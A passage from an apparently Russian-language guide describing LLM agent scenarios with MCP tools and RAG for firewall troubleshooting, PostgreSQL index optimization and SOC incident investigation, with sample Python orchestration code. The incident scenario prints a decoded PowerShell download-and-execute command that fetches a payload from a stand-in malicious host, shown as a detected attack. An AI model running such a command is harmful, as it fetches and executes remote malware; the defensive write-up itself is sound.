- RAG: архитектура сети, текущие firewall rules, требования ИБ
- LLM анализирует проблему → определяет нужные правила
- MCP инструменты: analyze_traffic, check_firewall, add_firewall_rule, test_connectivity
- Автоматическое создание правил с учетом политик безопасности

**Примеры запросов:**

```
Проблема: "Приложение на app-server-01 не может подключиться к базе db-server-01"

Workflow LLM + MCP + RAG:

1. [LLM анализирует]
   → Нужна проверка сетевой связности

2. [MCP: test_connectivity]
   → telnet app-server-01 → db-server-01:5432
   → Результат: Connection refused

3. [MCP: check_firewall_rules]
   → iptables -L -n | grep 5432
   → Результат: Нет правила для порта 5432

4. [RAG: поиск требований ИБ]
   → Найдено: "Доступ к БД только из application subnet 10.0.2.0/24"
   → Найдено: "Все firewall changes требуют logging"

5. [LLM создает правило с учетом политик]
   → Правило: разрешить 10.0.2.0/24 → db-server-01:5432/tcp с логированием

6. [MCP: validate_firewall_rule]
   → Проверка на конфликты с существующими правилами
   → Проверка соответствия политикам ИБ
   → Результат: ✓ Правило безопасно

7. [MCP: add_firewall_rule] (с dry-run)
   → Показ предпросмотра правила
   → Запрос подтверждения (если production)

8. [Подтверждение получено]

9. [MCP: add_firewall_rule] (apply)
   → iptables -A INPUT -s 10.0.2.0/24 -p tcp --dport 5432 -j LOG --log-prefix "DB_ACCESS"
   → iptables -A INPUT -s 10.0.2.0/24 -p tcp --dport 5432 -j ACCEPT
   → Результат: ✓ Правило добавлено

10. [MCP: test_connectivity]
    → telnet app-server-01 → db-server-01:5432
    → Результат: ✓ Connected

11. [MCP: create_firewall_documentation]
    → Обновлен firewall-rules.md
    → Создан тикет SEC-4567 для audit trail
```

**Требуется для реализации:**

**MCP серверы:**

1. **Network MCP**
   ```python
   Tools:
   - test_connectivity(source, destination, port, protocol)
   - traceroute(source, destination)
   - analyze_packet_capture(host, filter)  # tcpdump анализ
   - check_dns_resolution(hostname)
   ```

2. **Firewall MCP**
   ```python
   Tools:
   - check_firewall_rules(host, port=None)
   - add_firewall_rule(host, rule_spec, dry_run=True)
   - remove_firewall_rule(host, rule_id)
   - validate_firewall_rule(rule_spec)  # Проверка политик
   - backup_firewall_config(host)
   - restore_firewall_config(host, backup_id)
   ```

3. **Security Policy MCP** (с RAG)
   ```python
   Tools:
   - check_security_policy(action, resources)  # Проверка соответствия политикам
   - get_compliance_requirements(service_type)
   - validate_network_change(change_description)
   ```

**RAG база:**
- Архитектура сети (subnets, VLANs, security zones)
- Политики ИБ (разрешенные порты, source/destination restrictions)
- История изменений firewall (для анализа паттернов)
- Compliance требования (PCI DSS, и т.д.)

**Безопасность:**
- Все изменения firewall требуют approval для production
- Автоматический rollback через 5 минут если connectivity test failed
- Change window enforcement (изменения только в разрешенное время)
- Mandatory logging всех firewall events

**Оценка эффекта:**
- ⏱️ Экономия времени: 35 мин troubleshooting → 5 мин = −86%
- 🔒 Снижение рисков ИБ: автоматическая проверка политик (−90% ошибочных правил)
- 📊 Улучшение SLA: MTTR для сетевых проблем −75%
- 📚 Автоматическая документация: каждое изменение документируется

**Пример реального применения:**

```python
# network_troubleshooter.py
import requests

LLM_API = "http://llm-api:8000/v1/messages"

def troubleshoot_connectivity(source, destination, port):
    messages = [
        {
            "role": "user",
            "content": f"""Ты сетевой инженер. Пользователь сообщает о проблеме подключения.

Проблема: {source} не может подключиться к {destination}:{port}

Выполни диагностику и реши проблему:
1. Проверь connectivity (test_connectivity)
2. Если не работает - проверь firewall rules (check_firewall_rules)
3. Проверь политики безопасности (check_security_policy)
4. Если нужно добавить правило:
   - Сформируй правило согласно политикам ИБ
   - Провалидируй (validate_firewall_rule)
   - Добавь с dry-run сначала
   - Если dry-run OK - примени (с запросом approval для production)
5. Протестируй connectivity снова
6. Создай документацию

ВАЖНО: всегда учитывай security policies из RAG.

Начинай диагностику."""
        }
    ]
    
    # Выполнение с MCP + RAG
    response = requests.post(LLM_API, json={
        "model": "gigachat-latest",
        "messages": messages,
        "tools": load_network_mcp_tools() + load_security_policy_tools(),
        "max_tokens": 3000
    })
    
    # ... обработка tool calls аналогично предыдущим сценариям

# Использование
troubleshoot_connectivity(
    source="app-server-01",
    destination="db-server-01",
    port=5432
)
```

---

## Сценарий 15: Автоматическая оптимизация запросов к БД на основе анализа slow query log

**Текущая проблема:**
База данных медленная. DBA анализирует slow query log вручную (2-3 часа), находит проблемные запросы, предлагает индексы, переписывает запросы. Разработчики применяют исправления.

**Как LLM помогает (с MCP + RAG):**
- RAG: схема БД, существующие индексы, статистика запросов
- LLM анализирует slow queries → находит причины → предлагает оптимизации
- MCP инструменты: analyze_query, create_index, test_query_performance, apply_optimization
- Автоматическое создание и применение индексов (с проверкой влияния)

**Примеры запросов:**

```
Проблема: "База PostgreSQL тормозит, пользователи жалуются на медленную загрузку страниц"

Workflow LLM + MCP + RAG:

1. [MCP: get_slow_queries]
   → SELECT query, calls, mean_exec_time FROM pg_stat_statements ORDER BY mean_exec_time DESC LIMIT 10
   → Найдено: запрос "SELECT * FROM orders WHERE user_id = X" выполняется 15ms (50000 раз/час)

2. [MCP: analyze_query]
   → EXPLAIN ANALYZE для проблемного запроса
   → Результат: Seq Scan on orders (cost=0.00..25000 rows=1000000)

3. [RAG: проверка схемы БД]
   → Таблица orders: 5M строк, нет индекса на user_id

4. [LLM предлагает оптимизацию]
   → Создать индекс: CREATE INDEX idx_orders_user_id ON orders(user_id)

5. [MCP: estimate_index_impact]
   → Размер индекса: ~120MB
   → Ожидаемое ускорение: 15ms → 0.5ms (30x)
   → Влияние на INSERT: +5% времени

6. [RAG: проверка disk space]
   → Свободно на диске: 500GB (достаточно для индекса)

7. [MCP: create_index] (с CONCURRENTLY для production)
   → CREATE INDEX CONCURRENTLY idx_orders_user_id ON orders(user_id);
   → Выполнение... (5 минут)
   → Результат: ✓ Индекс создан

8. [MCP: test_query_performance]
   → EXPLAIN ANALYZE для того же запроса
   → Результат: Index Scan using idx_orders_user_id (cost=0.43..8.45 rows=1)
   → Время: 0.4ms (was 15ms) → ускорение 37x ✓

9. [MCP: monitor_query_performance]
   → Мониторинг в течение 10 минут
   → Результат: avg response time снизился с 15ms до 0.5ms

10. [MCP: create_optimization_report]
    → Отчет с описанием проблемы, решения, результатов
    → Создан тикет DBA-8901 для документации

11. [MCP: check_other_queries]
    → Найдены еще 3 похожих запроса без индексов
    → Автоматически создать индексы? [Запрос подтверждения]
```

**Требуется для реализации:**

**MCP серверы:**

1. **Database MCP** (PostgreSQL/MySQL)
   ```python
   Tools:
   - get_slow_queries(limit=10, min_duration_ms=100)
   - analyze_query(query_text)  # EXPLAIN ANALYZE
   - get_table_schema(table_name)
   - get_existing_indexes(table_name)
   - get_table_statistics(table_name)  # размер, кол-во строк
   - create_index(table, columns, concurrent=True)
   - drop_index(index_name)
   - estimate_index_impact(table, columns)
   - vacuum_analyze(table)  # обновление статистики
   ```

2. **Query Optimization MCP**
   ```python
   Tools:
   - rewrite_query(original_query, optimization_hint)
   - suggest_covering_index(query)
   - detect_n_plus_one(queries_list)  # обнаружение N+1 problem
   - suggest_query_refactoring(query)
   ```

3. **Monitoring MCP**
   ```python
   Tools:
   - get_db_metrics(metrics=['cpu', 'iops', 'connections'])
   - monitor_query_performance(query_hash, duration_minutes)
   - check_replication_lag()  # для master-slave
   - get_lock_waits()  # обнаружение deadlocks
   ```

**RAG база:**
- Схема БД (таблицы, колонки, типы, constraints)
- Существующие индексы и их usage statistics
- История оптимизаций (что работало, что нет)
- Best practices для конкретной СУБД

**Безопасность:**
- CREATE INDEX CONCURRENTLY для production (не блокирует таблицу)
- Rollback plan: возможность drop index если производительность ухудшилась
- Проверка disk space перед созданием индекса
- Ограничение: не более N индексов за раз (избежать перегрузки)

**Оценка эффекта:**
- ⏱️ Экономия времени DBA: 3 часа анализа → 15 минут = −92%
- 🚀 Улучшение производительности БД: ускорение запросов в 10-100x
- 📉 Снижение нагрузки на БД: −40% CPU usage благодаря индексам
- 💰 Экономия инфраструктуры: меньше нужно scaling благодаря оптимизации

**Пример реального применения:**

```python
# db_optimizer.py
import requests
import time

LLM_API = "http://llm-api:8000/v1/messages"

def optimize_database(db_connection_string):
    messages = [
        {
            "role": "user",
            "content": """Ты эксперт по оптимизации баз данных PostgreSQL. Выполни анализ и оптимизацию производительности.

Задачи:
1. Получи список медленных запросов (get_slow_queries)
2. Для каждого медленного запроса:
   - Проанализируй план выполнения (analyze_query)
   - Проверь существующие индексы (get_existing_indexes)
   - Если нужно - предложи создание индекса
   - Оцени влияние индекса (estimate_index_impact)
   - Если влияние положительное - создай индекс (create_index)
   - Протестируй производительность после (test_query_performance)
3. Создай отчет с результатами оптимизации

Начинай анализ."""
        }
    ]
    
    optimization_results = []
    
    for iteration in range(20):  # максимум 20 итераций
        response = requests.post(LLM_API, json={
            "model": "gigachat-latest",
            "messages": messages,
            "tools": load_database_mcp_tools(),
            "max_tokens": 2000
        })
        
        response_data = response.json()
        
        # Обработка tool calls
        tool_results = []
        for content_block in response_data['content']:
            if content_block['type'] == 'tool_use':
                tool_name = content_block['name']
                print(f"[{iteration+1}] {tool_name}...")
                
                tool_result = execute_database_mcp(
                    tool_name,
                    content_block['input'],
                    db_connection_string
                )
                
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": content_block['id'],
                    "content": json.dumps(tool_result)
                })
                
                # Логирование результатов
                if tool_name == 'create_index':
                    optimization_results.append({
                        'action': 'index_created',
                        'details': tool_result
                    })
            
            elif content_block['type'] == 'text':
                # Финальный отчет
                if 'Оптимизация завершена' in content_block['text']:
                    print("\n" + "="*50)
                    print(content_block['text'])
                    print("="*50)
                    return optimization_results
        
        if not tool_results:
            break
        
        messages.append({"role": "assistant", "content": response_data['content']})
        messages.append({"role": "user", "content": tool_results})
        
        time.sleep(0.5)
    
    return optimization_results

# Использование
results = optimize_database("postgresql://user:pass@db-server-01:5432/production")

print(f"\nВсего оптимизаций: {len(results)}")
for r in results:
    print(f"- {r['action']}: {r['details']}")
```

---

## Сценарий 16: Автоматическое расследование security инцидентов с помощью SOAR

**Текущая проблема:**
SOC получает 50-200 алертов/день. Аналитик тратит 30-60 минут на расследование каждого: сбор логов, проверка IP в threat intelligence, анализ активности пользователя, корреляция событий.

**Как LLM помогает (с MCP + RAG):**
- RAG: threat intelligence (MITRE ATT&CK, IOCs), baseline активности пользователей
- LLM выполняет automated investigation: сбор артефактов, анализ, классификация угрозы
- MCP инструменты: query_siem, check_threat_intel, get_user_activity, isolate_host, block_ip
- Автоматическое реагирование на подтвержденные угрозы (SOAR-like)

**Примеры запросов:**

```
Алерт: "Suspicious PowerShell execution on DESKTOP-USER01"

Workflow LLM + MCP + RAG (SOAR):

1. [LLM начинает расследование]
   → Нужно собрать контекст инцидента

2. [MCP: query_siem]
   → Запрос: все PowerShell события на DESKTOP-USER01 за последний час
   → Результат: обнаружено выполнение: powershell.exe -enc [base64_encoded_command]

3. [LLM декодирует]
   → Base64 декодирование команды
   → Результат: IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
   
4. [RAG: проверка IOC]
   → Поиск: malicious.com в threat intelligence
   → Найдено: известный C2 сервер (Cobalt Strike), IOC добавлен 2024-12-05

5. [MCP: get_user_activity]
   → Запрос: активность пользователя на DESKTOP-USER01 за 24 часа
   → Результат: логин в 14:30, открытие email вложения suspicious_invoice.docx в 14:45

6. [MCP: check_email_attachment]
   → Запрос: метаданные suspicious_invoice.docx
   → Результат: макрос обнаружен, VirusTotal: 45/70 vendors flagged as malicious

7. [LLM классифицирует]
   → Тип атаки: Phishing → Macro execution → PowerShell download → C2 beacon
   → MITRE ATT&CK: T1566.001 (Phishing: Spearphishing Attachment), T1059.001 (Command and Scripting Interpreter: PowerShell)
   → Критичность: HIGH (подтвержденная malware infection)

8. [LLM предлагает containment]
   → Изолировать хост DESKTOP-USER01
   → Заблокировать IP malicious.com на firewall
   → Проверить другие хосты на IOCs

9. [Запрос подтверждения у аналитика]
   → "Подтвердить изоляцию хоста? [Y/N]"

10. [Подтверждение получено: Y]

11. [MCP: isolate_host]
    → Отключение сетевого доступа DESKTOP-USER01 (кроме management VLAN)
    → Результат: ✓ Хост изолирован

12. [MCP: block_ip]
    → Добавление malicious.com в blacklist на firewall
    → Результат: ✓ IP заблокирован

13. [MCP: hunt_iocs]
    → Поиск IOCs (malicious.com, payload.ps1 hash) на других хостах
    → Результат: не обнаружено

14. [MCP: create_incident_report]
    → Автоматическое создание детального отчета:
      - Timeline событий
      - IOCs
      - MITRE ATT&CK mapping
      - Предпринятые действия
      - Рекомендации (обучение пользователей, усиление email security)
    
15. [MCP: notify_team]
    → Уведомление в Slack #security-incidents
    → Email руководству ИБ

16. [MCP: create_ticket]
    → Создан тикет SEC-7890 для remediation (переустановка ОС, смена паролей)
```

**Требуется для реализации:**

**MCP серверы:**

1. **SIEM MCP** (интеграция с Wazuh/OSSIM/Elasticsearch)
   ```python
   Tools:
   - query_siem(query, time_range, limit)
   - get_event_details(event_id)
   - correlate_events(event_ids)
   - search_ioc(ioc_value, ioc_type)  # IP, domain, hash
   - get_user_activity(username, time_range)
   - get_host_activity(hostname, time_range)
   ```

2. **Threat Intelligence MCP** (с RAG)
   ```python
   Tools:
   - check_ip_reputation(ip_address)
   - check_domain_reputation(domain)
   - check_file_hash(hash_value)
   - get_mitre_attack_info(technique_id)
   - search_cve(cve_id)
   - query_threat_feed(query)
   ```

3. **Response MCP** (SOAR actions)
   ```python
   Tools:
   - isolate_host(hostname, reason)
   - block_ip(ip_address, firewall_name)
   - block_domain(domain, dns_server)
   - disable_user_account(username, reason)
   - quarantine_file(host, file_path)
   - take_memory_dump(hostname)  # для forensics
   - take_disk_image(hostname)
   ```

4. **Communication MCP**
   ```python
   Tools:
   - create_incident_ticket(title, description, severity)
   - send_slack_alert(channel, message, severity)
   - send_email_alert(recipients, subject, body)
   - update_status_page(component, status, message)
   ```

**RAG база:**
- Threat intelligence feeds (AlienVault OTX, MISP, custom feeds)
- MITRE ATT&CK framework
- Baseline behavior пользователей и систем
- История инцидентов и playbooks реагирования
- Whitelist (известные безопасные IP/домены/процессы)

**Безопасность:**
- Approval workflow для деструктивных действий (isolate host, disable account)
- Confidence scoring: LLM оценивает уверенность в классификации (0-100%)
- Escalation: если confidence < 70% → эскалация аналитику
- Audit trail: все действия логируются с обоснованием

**Оценка эффекта:**
- ⏱️ Экономия времени: 45 мин расследования → 5 мин = −89%
- 🚨 Ускорение реагирования: containment в течение 10 минут вместо 1-2 часов (−85% MTTR)
- 📊 Увеличение throughput SOC: с 20 инцидентов/день до 80-100 (4x)
- 🎯 Снижение false positives: intelligent triage (−50% ложных срабатываний)
- 🔒 Снижение damage от инцидентов: быстрая изоляция (−70% scope of compromise)

**Пример реального применения:**

```python
# soar_investigation.py
import requests
import json
from datetime import datetime

LLM_API = "http://llm-api:8000/v1/messages"

def investigate_security_alert(alert):
    investigation_log = []
    
    messages = [
        {
            "role": "user",
            "content": f"""Ты security analyst в SOC. Проведи автоматическое расследование security alert.

Alert:
- Rule: {alert['rule_name']}
- Host: {alert['host']}
- Severity: {alert['severity']}
- Description: {alert['description']}
- Timestamp: {alert['timestamp']}

Твой investigation workflow:
1. Собери контекст (query_siem для связанных событий)
2. Проверь IOCs в threat intelligence (check_ip_reputation, check_domain_reputation, etc.)
3. Проанализируй активность пользователя/хоста (get_user_activity, get_host_activity)
4. Классифицируй инцидент:
   - Тип атаки
   - MITRE ATT&CK technique
   - Критичность (TRUE_POSITIVE_HIGH / TRUE_POSITIVE_MEDIUM / FALSE_POSITIVE)
   - Confidence level (0-100%)
5. Если TRUE_POSITIVE и confidence > 70%:
   - Предложи containment actions (isolate_host, block_ip, etc.)
   - Запроси подтверждение для деструктивных действий
   - Выполни одобренные действия
6. Создай incident report
7. Уведоми команду

ВАЖНО: для деструктивных действий ВСЕГДА запрашивай подтверждение с обоснованием.

Начинай расследование."""
        }
    ]
    
    # Итеративное расследование
    for iteration in range(15):
        response = requests.post(LLM_API, json={
            "model": "gigachat-latest",
            "messages": messages,
            "tools": load_soar_mcp_tools(),
            "max_tokens": 3000
        })
        
        response_data = response.json()
        
        # Обработка tool calls
        tool_results = []
        for content_block in response_data['content']:
            if content_block['type'] == 'tool_use':
                tool_name = content_block['name']
                tool_input = content_block['input']
                
                print(f"\n[{iteration+1}] 🔧 {tool_name}")
                print(f"    Input: {json.dumps(tool_input, indent=2)}")
                
                # Проверка на деструктивные действия
                if tool_name in ['isolate_host', 'block_ip', 'disable_user_account']:
                    approval = request_approval(tool_name, tool_input, investigation_log)
                    
                    if not approval:
                        tool_result = {'status': 'cancelled', 'reason': 'Approval denied'}
                        print(f"    ❌ Action cancelled by analyst")
                    else:
                        tool_result = execute_soar_mcp(tool_name, tool_input)
                        print(f"    ✓ Executed with approval")
                else:
                    tool_result = execute_soar_mcp(tool_name, tool_input)
                    print(f"    Result: {json.dumps(tool_result, indent=2)[:200]}...")
                
                investigation_log.append({
                    'timestamp': datetime.now().isoformat(),
                    'tool': tool_name,
                    'input': tool_input,
                    'result': tool_result
                })
                
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": content_block['id'],
                    "content": json.dumps(tool_result)
                })
            
            elif content_block['type'] == 'text':
                print(f"\n[LLM Analysis]\n{content_block['text']}\n")
                
                # Проверка на завершение расследования
                if 'Расследование завершено' in content_block['text'] or \
                   'Investigation complete' in content_block['text']:
                    save_investigation_report(alert, investigation_log, content_block['text'])
                    return {
                        'status': 'completed',
                        'log': investigation_log,
                        'summary': content_block['text']
                    }
        
        if not tool_results:
            break
        
        messages.append({"role": "assistant", "content": response_data['content']})
        messages.append({"role": "user", "content": tool_results})
    
    return {'status': 'incomplete', 'log': investigation_log}

def request_approval(action, params, context):
    """Запрос подтверждения у аналитика для деструктивных действий"""
    print("\n" + "="*60)
    print(f"⚠️  APPROVAL REQUIRED: {action}")
    print("="*60)
    print(f"Parameters: {json.dumps(params, indent=2)}")
    print(f"\nContext: {len(context)} investigation steps completed")
    print("\nApprove this action? [Y/N]: ", end='')
    
    # В реальной системе - через web UI или Slack interactive button
    response = input().strip().upper()
    return response == 'Y'

def save_investigation_report(alert, log, summary):
    """Сохранение отчета о расследовании"""
    report = {
        'alert': alert,
        'investigation_log': log,
        'summary': summary,
        'timestamp': datetime.now().isoformat()
    }
    
    filename = f"investigation_{alert['host']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(f"/var/log/soar/{filename}", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n✓ Investigation report saved: {filename}")

# Использование
alert = {
    'rule_name': 'Suspicious PowerShell Execution',
    'host': 'DESKTOP-USER01',
    'severity': 'high',
    'description': 'Encoded PowerShell command detected',
    'timestamp': '2024-12-07T15:23:41Z'
}

result = investigate_security_alert(alert)
```

---

## Сценарий 17: Проектирование архитектуры решений с учетом требований

**Текущая проблема:**
Задача: "Нужна система для обработки 10K запросов/сек с latency <100ms". Архитектор тратит 5-8 часов: выбор компонентов, проектирование архитектуры, оценка capacity, создание диаграмм.

**Как LLM помогает (с RAG):**
- RAG: текущий стек, успешные паттерны архитектуры, ограничения инфраструктуры
- LLM проектирует архитектуру с учетом требований и контекста компании
- Генерирует: архитектурные диаграммы (PlantUML/Mermaid), capacity planning, cost estimation

**Примеры запросов:**

```
Требования: "Разработать систему обработки платежей: 10K TPS, latency <100ms, PCI DSS compliance, 99.99% availability"

Workflow LLM + RAG:

1. [LLM анализирует требования]
   → Функциональные: payment processing, fraud detection, notifications
   → Non-functional: 10K TPS, <100ms latency, high availability, compliance

2. [RAG: текущий стек]
   → Найдено: используем PostgreSQL, Redis, Python, Kubernetes

3. [RAG: compliance требования]
   → Найдено: PCI DSS требует шифрование, audit logging, network segmentation

4. [LLM проектирует архитектуру]
   → API Gateway (rate limiting, auth) 
   → Payment Service (Python FastAPI, stateless)
   → Fraud Detection Service (ML model)
   → PostgreSQL (transactional data, encrypted)
   → Redis (caching, session storage)
   → Message Queue (async notifications)
   → Audit Log Service (compliance)

5. [LLM генерирует capacity planning]
   → 10K TPS = 10000 req/sec
   → При latency budget 100ms: можно обработать 1 req в 100ms
   → Нужно: 10000 / (1000/100) = 1000 параллельных workers
   → Payment Service: 10 pods × 100 workers = 1000 workers
   → PostgreSQL: master + 2 read replicas (read-heavy workload)
   → Redis: 3-node cluster (HA)

6. [LLM создает диаграмму PlantUML]

```plantuml
@startuml
!define RECTANGLE

